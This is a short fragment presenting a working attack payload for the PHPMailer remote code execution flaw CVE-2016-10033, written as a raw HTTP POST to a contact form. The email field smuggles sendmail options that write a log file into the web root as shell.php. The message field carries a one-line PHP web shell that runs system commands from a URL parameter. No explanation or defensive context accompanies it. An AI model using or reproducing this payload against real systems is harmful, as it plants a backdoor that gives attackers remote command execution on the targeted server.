**Attack Payload** (PHPMailer RCE - CVE-2016-10033):
```text
POST /contact.php HTTP/1.1
Host: vulnerable-site.com
Content-Type: application/x-www-form-urlencoded

email="attacker\" -OQueueDirectory=/tmp -X/var/www/html/shell.php @example.com"
&subject=Test
&message=<?php system($_GET['cmd']); ?>
